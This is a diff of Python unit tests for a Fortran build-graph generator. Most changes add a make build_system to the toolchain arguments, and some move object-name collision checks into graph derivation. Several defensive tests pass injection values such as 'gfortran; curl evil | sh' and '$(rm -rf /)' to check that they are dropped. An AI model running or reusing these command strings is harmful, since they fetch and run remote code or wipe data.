@@ -117,7 +117,7 @@ class MultiFileSourceTest(unittest.TestCase):
         ]
         self.assertEqual(cb.validate_bundle(doc), [])
 
-        graph = cb.derive_build_graph(doc, toolchain={"language": "fortran"})
+        graph = cb.derive_build_graph(doc, toolchain={"build_system": "make", "language": "fortran"})
         self.assertEqual([unit["object"] for unit in graph["compile_units"]], [
             # model -> internal_module (unit-shared first) -> helper -> checks: the model
             # compiles alone, and a private file may `use` it (issue #415)
@@ -131,7 +131,7 @@ class MultiFileSourceTest(unittest.TestCase):
         doc["files"] += [_file("z_helper.f90", "helper", ADV),
                          _file("a_helper.f90", "helper", ADV)]
         self.assertEqual(cb.validate_bundle(doc), [])
-        graph = cb.derive_build_graph(doc, toolchain={})
+        graph = cb.derive_build_graph(doc, toolchain={"build_system": "make"})
         self.assertEqual([unit["object"] for unit in graph["compile_units"]][1:3],
                          ["a_helper.o", "z_helper.o"])
 
@@ -365,7 +365,7 @@ class DeterministicBuildGraphTest(unittest.TestCase):
         shuffled["files"] = list(reversed(shuffled["files"]))
 
         kwargs = {"dependency_closure": (HARNESS,),
-                  "toolchain": {"language": "fortran", "standard": "f2008"},
+                  "toolchain": {"language": "fortran", "standard": "f2008", "build_system": "make"},
                   "host_glue_sources": ("adv1d_runner.f90",)}
         first = json.dumps(cb.derive_build_graph(doc, **kwargs), sort_keys=True)
         second = json.dumps(cb.derive_build_graph(shuffled, **kwargs), sort_keys=True)
@@ -375,7 +375,7 @@ class DeterministicBuildGraphTest(unittest.TestCase):
         graph = cb.derive_build_graph(
             _minimal_bundle(),
             dependency_closure=("component/base@0.1.0", "component/mid@0.1.0"),
-            toolchain={"language": "fortran"}, host_glue_sources=("adv1d_runner.f90",))
+            toolchain={"build_system": "make", "language": "fortran"}, host_glue_sources=("adv1d_runner.f90",))
         self.assertEqual([unit["source"] for unit in graph["compile_units"]], [
             "staged:base_model.f90", "staged:mid_model.f90",
             "bundle:adv1d_model.f90", "bundle:adv1d_checks.f90",
@@ -410,7 +410,7 @@ class DeterministicBuildGraphTest(unittest.TestCase):
         self.assertNotIn("rm -rf", json.dumps(graph))
 
     def test_toolchain_projection_is_an_isolated_copy(self) -> None:
-        toolchain = {"language": "fortran", "standard": "f2008"}
+        toolchain = {"language": "fortran", "standard": "f2008", "build_system": "make"}
         graph = cb.derive_build_graph(_minimal_bundle(), toolchain=toolchain)
         graph["toolchain"]["standard"] = "f2018"
         self.assertEqual(toolchain["standard"], "f2008")
@@ -425,10 +425,10 @@ class DeterministicBuildGraphTest(unittest.TestCase):
 
     def test_shell_syntax_in_an_executable_selector_is_dropped(self) -> None:
         # compiler/linker are run as a program; a shell string must never reach the graph.
-        graph = cb.derive_build_graph(_minimal_bundle(), toolchain={
+        graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"build_system": "make",
             "language": "fortran", "compiler": "gfortran; curl evil | sh",
             "linker": "$(rm -rf /)"})
-        self.assertEqual(graph["toolchain"], {"language": "fortran"})
+        self.assertEqual(graph["toolchain"], {"build_system": "make", "language": "fortran"})
         self.assertNotIn("curl", json.dumps(graph))
 
     def test_recognized_fortran_compiler_drivers_are_kept(self) -> None:
@@ -436,8 +436,8 @@ class DeterministicBuildGraphTest(unittest.TestCase):
         for value in ("gfortran", "gfortran-12", "x86_64-linux-gnu-gfortran-12",
                       "mpif90", "frt", "frtpx", "ifx", "nvfortran", "flang-new", "crayftn"):
             with self.subTest(compiler=value):
-                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
-                self.assertEqual(graph["toolchain"], {"compiler": value})
+                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"build_system": "make", "compiler": value})
+                self.assertEqual(graph["toolchain"], {"build_system": "make", "compiler": value})
 
     def test_a_wrong_language_compiler_driver_is_dropped(self) -> None:
         # A C/C++-only driver would be pinned as FC and deterministically fail on `.f90`, so it
@@ -445,7 +445,7 @@ class DeterministicBuildGraphTest(unittest.TestCase):
         for value in ("gcc", "g++", "clang", "icc", "icx", "nvc", "mpicc", "fcc", "FCCpx",
                       "xlc", "armclang"):
             with self.subTest(compiler=value):
-                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
+                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"build_system": "make", "compiler": value})
                 self.assertNotIn("compiler", graph["toolchain"])
 
     def test_executable_selectors_that_are_not_recognized_drivers_are_dropped(self) -> None:
@@ -454,40 +454,40 @@ class DeterministicBuildGraphTest(unittest.TestCase):
         for value in ("sh", "bash", "/tmp/payload", "/usr/bin/gfortran", "foo/../../payload",
                       "python3", "make"):
             with self.subTest(compiler=value):
-                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
-                self.assertEqual(graph["toolchain"], {})
+                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"build_system": "make", "compiler": value})
+                self.assertEqual(graph["toolchain"], {"build_system": "make"})
 
     def test_a_compiler_looking_suffix_on_an_arbitrary_prefix_is_dropped(self) -> None:
         # The cross-compiler prefix must be a target triple (arch-first), not an arbitrary
         # token: `payload-gfortran` on PATH would otherwise be run as a "compiler".
         for value in ("payload-gfortran", "sh-gfortran", "evil-gcc", "notanarch-linux-gnu-gfortran"):
             with self.subTest(compiler=value):
-                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
-                self.assertEqual(graph["toolchain"], {})
+                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"build_system": "make", "compiler": value})
+                self.assertEqual(graph["toolchain"], {"build_system": "make"})
         # a genuine target triple (known arch first) is kept
         for value in ("x86_64-linux-gnu-gfortran-12", "aarch64-linux-gnu-gfortran",
                       "powerpc64le-linux-gnu-gfortran"):
             with self.subTest(compiler=value):
-                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
-                self.assertEqual(graph["toolchain"], {"compiler": value})
+                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"build_system": "make", "compiler": value})
+                self.assertEqual(graph["toolchain"], {"build_system": "make", "compiler": value})
 
     def test_declarative_field_with_shell_metacharacters_is_dropped(self) -> None:
         graph = cb.derive_build_graph(_minimal_bundle(),
-                                      toolchain={"standard": "f2008 -o /etc/x", "backend": "openmp"})
-        self.assertEqual(graph["toolchain"], {"backend": "openmp"})
+                                      toolchain={"build_system": "make", "standard": "f2008 -o /etc/x", "backend": "openmp"})
+        self.assertEqual(graph["toolchain"], {"build_system": "make", "backend": "openmp"})
 
     def test_unset_compiler_is_dropped_not_carried_empty(self) -> None:
         # _read_toolchain yields "" for an unset compiler; "" is not a selector.
         graph = cb.derive_build_graph(_minimal_bundle(),
-                                      toolchain={"language": "fortran", "compiler": ""})
-        self.assertEqual(graph["toolchain"], {"language": "fortran"})
+                                      toolchain={"build_system": "make", "language": "fortran", "compiler": ""})
+        self.assertEqual(graph["toolchain"], {"build_system": "make", "language": "fortran"})
 
     def test_nested_paths_cannot_collide_on_an_object_name(self) -> None:
         doc = _minimal_bundle()
         doc["files"] += [_file("core/util.f90", "helper", ADV),
                          _file("io/util.f90", "helper", ADV)]
         self.assertEqual(cb.validate_bundle(doc), [])
-        objects = [unit["object"] for unit in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
+        objects = [unit["object"] for unit in cb.derive_build_graph(doc, toolchain={"build_system": "make"})["compile_units"]]
         self.assertEqual(len(set(objects)), len(objects))
         self.assertIn("core__util.o", objects)
 
@@ -598,13 +598,13 @@ class CompileAfterTest(unittest.TestCase):
         # The hazard the field exists to remove: a_consumer sorts before z_base lexically.
         doc = self._two_internal_modules(edge=False)
         self.assertEqual(cb.validate_bundle(doc), [])
-        order = [u["object"] for u in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
+        order = [u["object"] for u in cb.derive_build_graph(doc, toolchain={"build_system": "make"})["compile_units"]]
         self.assertLess(order.index("a_consumer.o"), order.index("z_base.o"))
 
     def test_compile_after_reorders_the_provider_first(self) -> None:
         doc = self._two_internal_modules(edge=True)
         self.assertEqual(cb.validate_bundle(doc), [])
-        units = cb.derive_build_graph(doc, toolchain={})["compile_units"]
+        units = cb.derive_build_graph(doc, toolchain={"build_system": "make"})["compile_units"]
         order = [u["object"] for u in units]
         self.assertLess(order.index("z_base.o"), order.index("a_consumer.o"))
         # the conservative prerequisites therefore already include the provider
@@ -616,8 +616,8 @@ class CompileAfterTest(unittest.TestCase):
         shuffled = copy.deepcopy(doc)
         shuffled["files"] = list(reversed(shuffled["files"]))
         self.assertEqual(
-            json.dumps(cb.derive_build_graph(doc, toolchain={}), sort_keys=True),
-            json.dumps(cb.derive_build_graph(shuffled, toolchain={}), sort_keys=True))
+            json.dumps(cb.derive_build_graph(doc, toolchain={"build_system": "make"}), sort_keys=True),
+            json.dumps(cb.derive_build_graph(shuffled, toolchain={"build_system": "make"}), sort_keys=True))
 
     def test_a_chain_orders_transitively(self) -> None:
         doc = _minimal_bundle()
@@ -627,7 +627,7 @@ class CompileAfterTest(unittest.TestCase):
             _file("a.f90", "internal_module", ADV),
         ]
         self.assertEqual(cb.validate_bundle(doc), [])
-        order = [u["object"] for u in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
+        order = [u["object"] for u in cb.derive_build_graph(doc, toolchain={"build_system": "make"})["compile_units"]]
         self.assertLess(order.index("a.o"), order.index("b.o"))
         self.assertLess(order.index("b.o"), order.index("c.o"))
 
@@ -706,7 +706,7 @@ class CompileAfterTest(unittest.TestCase):
             dict(_file("p.f90", "internal_module", ADV), compile_after=["q.f90"]),
             dict(_file("q.f90", "internal_module", ADV), compile_after=["p.f90"]),
         ]
-        objects = [u["object"] for u in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
+        objects = [u["object"] for u in cb.derive_build_graph(doc, toolchain={"build_system": "make"})["compile_units"]]
         self.assertEqual(sorted(objects),
                          sorted(["p.o", "q.o", "adv1d_model.o", "adv1d_checks.o"]))
 
@@ -1055,7 +1055,7 @@ class FieldGrammarTest(unittest.TestCase):
     def test_graph_strings_hold_no_shell_metacharacters(self) -> None:
         graph = cb.derive_build_graph(
             _minimal_bundle(), dependency_closure=("infrastructure/harness_fortran_cpu@0.7.0",),
-            toolchain={"language": "fortran"}, host_glue_sources=("adv1d_runner.f90",))
+            toolchain={"build_system": "make", "language": "fortran"}, host_glue_sources=("adv1d_runner.f90",))
         for unit in graph["compile_units"]:
             for value in (unit["source"], unit["object"], *unit["prerequisite_objects"]):
                 self.assertNotRegex(value, r"[;&|`$*?<>(){}\s]")
@@ -1279,7 +1279,7 @@ class HostGivenNamesAreTheLanguagesTest(unittest.TestCase):
                 mock.patch.object(bundle, "checks_basename", lambda sid: f"{sid}_checks.zz"):
             graph = cb.derive_build_graph(
                 _minimal_bundle(), dependency_closure=("component/diffuse@0.1.0",),
-                toolchain={"language": "fortran"})
+                toolchain={"build_system": "make", "language": "fortran"})
             self.assertIn("staged:diffuse_model.zz",
                           [u["source"] for u in graph["compile_units"]])
             violation = cb.m3c_literal_name_violation(
@@ -1293,7 +1293,7 @@ class HostGivenNamesAreTheLanguagesTest(unittest.TestCase):
         with self.assertRaises(ValueError) as ctx:
             cb.derive_build_graph(_minimal_bundle(),
                                   dependency_closure=("component/diffuse@0.1.0",),
-                                  toolchain={"language": "cpp"})
+                                  toolchain={"build_system": "make", "language": "cpp"})
         self.assertIn("no bundle facts", str(ctx.exception))
         with self.assertRaises(ValueError):
             cb.m3c_literal_name_violation({"files": []}, "bx", language="cpp")
@@ -1306,25 +1306,50 @@ class ObjectNameCollisionTest(unittest.TestCase):
     host-rendered glue's object."""
 
     def test_flattened_paths_that_collide_are_rejected(self) -> None:
+        # Refused at ASSEMBLY, where the target build system's object-name rule is known
+        # (issue #424 PR-2 deleted the toolchain-free copy of this check in `validate_bundle`;
+        # `PureStateBindingLayerTests.test_an_in_bundle_object_collision_is_an_assembly_finding`
+        # drives the acceptance path that reports it).
         doc = _minimal_bundle()
         doc["files"] += [_file("a/b.f90", "helper", ADV), _file("a__b.f90", "helper", ADV)]
-        self.assertIn(
-            "files[3].logical_path 'a__b.f90' derives the same object name as 'a/b.f90'",
-            cb.validate_bundle(doc))
+        self.assertEqual(cb.validate_bundle(doc), [])
+        with self.assertRaisesRegex(RuntimeError, r"object name collision \['a__b.o'\]"):
+            cb.derive_build_graph(doc, toolchain={"build_system": "make", "language": "fortran"})
+
+    def test_the_object_name_is_the_target_build_system_s(self) -> None:
+        """`derive_build_graph` keys every object on the build system's
+        `control_file.object_name` (issue #424 PR-2): moving that rule moves the graph, and a
+        toolchain naming no build system with that capability is refused rather than keyed by
+        another one's rule."""
+        from unittest import mock
+
+        from tools.backends.build_system.make import control_file
+        with mock.patch.object(control_file, "object_name", lambda path: f"zz:{path}"):
+            graph = cb.derive_build_graph(
+                _minimal_bundle(), dependency_closure=("component/diffuse@0.1.0",),
+                toolchain={"build_system": "make", "language": "fortran"},
+                host_glue_sources=("adv1d_runner.f90",))
+        self.assertEqual([u["object"] for u in graph["compile_units"]],
+                         ["zz:diffuse_model.f90", "zz:adv1d_model.f90", "zz:adv1d_checks.f90",
+                          "zz:adv1d_runner.f90"])
+        for toolchain in ({}, {"build_system": ""}, {"build_system": "cmake"}):
+            with self.subTest(toolchain=toolchain), \
+                    self.assertRaisesRegex(RuntimeError, "no object-name rule"):
+                cb.derive_build_graph(_minimal_bundle(), toolchain=toolchain)
 
     def test_bundle_file_cannot_capture_the_host_glue_object(self) -> None:
         doc = _minimal_bundle()
         doc["files"].append(_file("adv1d_runner.f90", "helper", ADV))
         self.assertEqual(cb.validate_bundle(doc), [])  # the bundle alone is well-formed
         with self.assertRaisesRegex(RuntimeError, "object name collision"):
-            cb.derive_build_graph(doc, toolchain={}, host_glue_sources=("adv1d_runner.f90",))
+            cb.derive_build_graph(doc, toolchain={"build_system": "make"}, host_glue_sources=("adv1d_runner.f90",))
 
     def test_bundle_file_cannot_capture_a_staged_dependency_object(self) -> None:
         doc = _minimal_bundle()
         doc["files"].append(_file("diffuse_model.f90", "helper", ADV))
         with self.assertRaisesRegex(RuntimeError, "object name collision"):
             cb.derive_build_graph(
-                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={"language": "fortran"})
+                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={"build_system": "make", "language": "fortran"})
 
     def test_a_bare_spec_id_in_the_closure_is_rejected(self) -> None:
         # dependency_closure is node_keys; a bare spec_id (the shape _dependency_closure returns)
@@ -1332,7 +1357,7 @@ class ObjectNameCollisionTest(unittest.TestCase):
         with self.assertRaisesRegex(RuntimeError, "must be node_keys"):
             cb.derive_build_graph(
                 _minimal_bundle(), dependency_closure=("diffuse", "component/mid@0.1.0"),
-                toolchain={"language": "fortran"})
+                toolchain={"build_system": "make", "language": "fortran"})
 
     def test_bundle_module_cannot_collide_with_a_staged_dependency_module(self) -> None:
         # Even at a DISTINCT object name, a bundle file declaring a module a staged dependency
@@ -1343,18 +1368,18 @@ class ObjectNameCollisionTest(unittest.TestCase):
         self.assertEqual(cb.validate_bundle(doc), [])  # the bundle alone is well-formed
         with self.assertRaisesRegex(RuntimeError, "module name collision"):
             cb.derive_build_graph(
-                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={"language": "fortran"})
+                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={"build_system": "make", "language": "fortran"})
         # case-insensitively (Fortran module names are case-insensitive)
         doc["files"][-1]["modules"] = ["DIFFUSE_MODEL"]
         with self.assertRaisesRegex(RuntimeError, "module name collision"):
             cb.derive_build_graph(
-                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={"language": "fortran"})
+                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={"build_system": "make", "language": "fortran"})
 
     def test_a_member_model_module_does_not_false_collide_with_the_closure(self) -> None:
         # A member is excluded from the staged closure, so the bundle's own `<spec_id>_model`
         # module is not a staged module — no false collision.
         doc = _multi_node_bundle()  # member component/adv_flux@0.1.0 declares module adv_flux_model
-        graph = cb.derive_build_graph(doc, dependency_closure=(FLUX,), toolchain={"language": "fortran"})
+        graph = cb.derive_build_graph(doc, dependency_closure=(FLUX,), toolchain={"build_system": "make", "language": "fortran"})
         self.assertIn("adv_flux_model.o", graph["link"]["objects"])
 
     def test_a_distinct_dep_sharing_a_member_spec_id_is_not_silently_dropped(self) -> None:
@@ -1365,20 +1390,21 @@ class ObjectNameCollisionTest(unittest.TestCase):
         doc = _multi_node_bundle()  # member component/adv_flux@0.1.0
         with self.assertRaisesRegex(RuntimeError, "object name collision"):
             cb.derive_build_graph(
-                doc, dependency_closure=("component/adv_flux@2.0.0",), toolchain={"language": "fortran"})
+                doc, dependency_closure=("component/adv_flux@2.0.0",), toolchain={"build_system": "make", "language": "fortran"})
 
     def test_object_names_collide_case_insensitively(self) -> None:
         # `a/b.f90` and `A__B.f90` differ after case folding as PATHS, but their objects
         # (`a__b.o` / `A__B.o`) are one file on a case-insensitive filesystem.
         doc = _minimal_bundle()
         doc["files"] += [_file("a/b.f90", "helper", ADV), _file("A__B.f90", "helper", ADV)]
-        self.assertTrue(any("derives the same object name" in v for v in cb.validate_bundle(doc)))
+        with self.assertRaisesRegex(RuntimeError, "object name collision"):
+            cb.derive_build_graph(doc, toolchain={"build_system": "make", "language": "fortran"})
 
     def test_cross_origin_collision_is_case_insensitive(self) -> None:
         doc = _minimal_bundle()
         doc["files"].append(_file("ADV1D_RUNNER.f90", "helper", ADV))
         with self.assertRaisesRegex(RuntimeError, "object name collision"):
-            cb.derive_build_graph(doc, toolchain={}, host_glue_sources=("adv1d_runner.f90",))
+            cb.derive_build_graph(doc, toolchain={"build_system": "make"}, host_glue_sources=("adv1d_runner.f90",))
 
 
 class EntrypointAttributionTest(unittest.TestCase):
@@ -1550,7 +1576,7 @@ class MultiNodeOptimizationUnitTest(unittest.TestCase):
 
     def test_graph_respects_member_order_within_a_role(self) -> None:
         doc = _multi_node_bundle()
-        graph = cb.derive_build_graph(doc, toolchain={})
+        graph = cb.derive_build_graph(doc, toolchain={"build_system": "make"})
         self.assertEqual([unit["object"] for unit in graph["compile_units"]], [
             "adv_flux_model.o", "adv1d_model.o",    # models in member order
             "unit_types.o",                         # then the unit-shared internal module
@@ -1723,7 +1749,7 @@ class MultiNodeOptimizationUnitTest(unittest.TestCase):
         doc["target_lowering_plan"]["fusion"] = [{"members": [ADV, FLUX]}]
         self.assertEqual(cb.validate_bundle(doc), [])
         self.assertEqual(cb.optimization_unit_members(doc), (ADV, FLUX))
-        graph = cb.derive_build_graph(doc, toolchain={})
+        graph = cb.derive_build_graph(doc, toolchain={"build_system": "make"})
         self.assertEqual([unit["object"] for unit in graph["compile_units"]], [
             "adv1d_model.o", "adv_flux_model.o",
             "unit_types.o",
@@ -1735,7 +1761,7 @@ class MultiNodeOptimizationUnitTest(unittest.TestCase):
         # implementation is in the bundle (its own model file); it must be excluded from the
         # staged closure, or `<spec_id>_model.o` collides / links twice.
         doc = _multi_node_bundle()  # members: adv_flux, adv1d
-        graph = cb.derive_build_graph(doc, dependency_closure=(FLUX,), toolchain={"language": "fortran"})
+        graph = cb.derive_build_graph(doc, dependency_closure=(FLUX,), toolchain={"build_system": "make", "language": "fortran"})
         sources = [unit["source"] for unit in graph["compile_units"]]
         self.assertNotIn("staged:adv_flux_model.f90", sources)
         objects = graph["link"]["objects"]
@@ -1747,7 +1773,7 @@ class MultiNodeOptimizationUnitTest(unittest.TestCase):
         # closure deepest-first: base (index 0, staged) then FLUX (index 1, member) — the
         # member is shallower than the staged dep, so this is the buildable shape.
         graph = cb.derive_build_graph(
-            doc, dependency_closure=("component/base@0.1.0", FLUX), toolchain={"language": "fortran"})
+            doc, dependency_closure=("component/base@0.1.0", FLUX), toolchain={"build_system": "make", "language": "fortran"})
         sources = [unit["source"] for unit in graph["compile_units"]]
         self.assertIn("staged:base_model.f90", sources)          # a real dep, kept
         self.assertNotIn("staged:adv_flux_model.f90", sources)   # a member (FLUX), dropped
@@ -1762,7 +1788,7 @@ class MultiNodeOptimizationUnitTest(unittest.TestCase):
         dependent = "component/dependent@0.1.0"
         with self.assertRaisesRegex(RuntimeError, "straddles a staged dependency"):
             cb.derive_build_graph(
-                doc, dependency_closure=(FLUX, dependent), toolchain={"language": "fortran"},
+                doc, dependency_closure=(FLUX, dependent), toolchain={"build_system": "make", "language": "fortran"},
                 dependency_edges={dependent: {FLUX}})
 
     def test_independent_staged_branch_is_not_a_straddle(self) -> None:
@@ -1772,9 +1798,9 @@ class MultiNodeOptimizationUnitTest(unittest.TestCase):
         doc = _multi_node_bundle()  # member component/adv_flux@0.1.0
         independent = "component/independent@0.1.0"
         self.assertTrue(cb.derive_build_graph(
-            doc, dependency_closure=(FLUX, independent), toolchain={"language": "fortran"}))
+            doc, dependency_closure=(FLUX, independent), toolchain={"build_system": "make", "language": "fortran"}))
         self.assertTrue(cb.derive_build_graph(
-            doc, dependency_closure=(FLUX, independent), toolchain={"language": "fortran"},
+            doc, dependency_closure=(FLUX, independent), toolchain={"build_system": "make", "language": "fortran"},
             dependency_edges={independent: set()}))  # explicitly no dep on FLUX
 
 
@@ -3075,7 +3101,7 @@ class RunnerRoleTest(unittest.TestCase):
     def test_the_runner_compiles_last(self) -> None:
         doc = self._harness_bundle()
         doc["files"].insert(0, _file("hfc_types.f90", "internal_module", HARNESS))
-        graph = cb.derive_build_graph(doc, toolchain={"language": "fortran"})
+        graph = cb.derive_build_graph(doc, toolchain={"build_system": "make", "language": "fortran"})
         self.assertEqual([unit["object"] for unit in graph["compile_units"]],
                          ["harness_fortran_cpu_model.o", "hfc_types.o",
                           "harness_fortran_cpu_runner.o"])
@@ -3110,7 +3136,7 @@ class RunnerRoleTest(unittest.TestCase):
         for entry in doc["files"]:
             entry["content"] = contents[entry["logical_path"]]
         self.assertEqual(cb.validate_bundle(doc), [])
-        graph = cb.derive_build_graph(doc, toolchain={"language": "fortran"})
+        graph = cb.derive_build_graph(doc, toolchain={"build_system": "make", "language": "fortran"})
         rules = registry.capability_module("language", "fortran", "control_file").rules(
             standard="f2008", parallel_backend="none")
         makefile = registry.capability_module("build_system", "make", "control_file") \
@@ -3133,7 +3159,7 @@ class RunnerRoleTest(unittest.TestCase):
         doc = self._harness_bundle()
         with self.assertRaises(RuntimeError) as ctx:
             cb.derive_build_graph(
-                doc, toolchain={"language": "fortran"},
+                doc, toolchain={"build_system": "make", "language": "fortran"},
                 host_glue_sources=("harness_fortran_cpu_runner.f90",))
         self.assertIn("object name collision", str(ctx.exception))
 
@@ -3203,6 +3229,30 @@ class PureStateBindingLayerTests(unittest.TestCase):
                 build_graph=lambda d: None, ir_published_operations=None)
         self.assertEqual(r, ("bundle_state_binding_mismatch", "stop here"))
         self.assertEqual(layer.call_args.kwargs, {"language": "zz_target"})
+
+    def test_an_in_bundle_object_collision_is_an_assembly_finding(self) -> None:
+        """Two bundle files deriving one object name reach the leaf as
+        `bundle_assembly_collision` from the build graph — the one place the target build
+        system's object-name rule is applied (issue #424 PR-2; `validate_bundle` reported it
+        as a schema violation until then, without knowing the build system)."""
+        doc = self._bundle([self._binding("q")])
+        for path, stem in (("a/b.f90", "bx_h1"), ("A__B.f90", "bx_h2")):
+            doc["files"].append({"logical_path": path, "role": "helper", "language": "fortran",
+                                 "member_node_key": self._NK,
+                                 "content": f"module {stem}\nend module {stem}\n",
+                                 "modules": [stem]})
+        self.assertEqual(cb.validate_bundle(doc), [])
+        r = cb.pure_bundle_contract_violation(
+            doc, node_key=self._NK, spec_id="bx", shape="m3c",
+            language="fortran", runner_basename="bx_runner.f90", ir_snapshot_variables=["q"],
+            harness_provided={"sync_single_case@1", "state_registration@1"},
+            build_graph=lambda d: cb.derive_build_graph(
+                d, toolchain={"build_system": "make", "language": "fortran"},
+                host_glue_sources=("bx_runner.f90",)),
+            ir_published_operations=None)
+        self.assertIsNotNone(r)
+        self.assertEqual(r[0], "bundle_assembly_collision", r)
+        self.assertIn("object name collision", r[1])
 
     def test_the_convention_is_accepted(self) -> None:
         self.assertIsNone(self._run(self._bundle([self._binding("q")]), ["q"]))
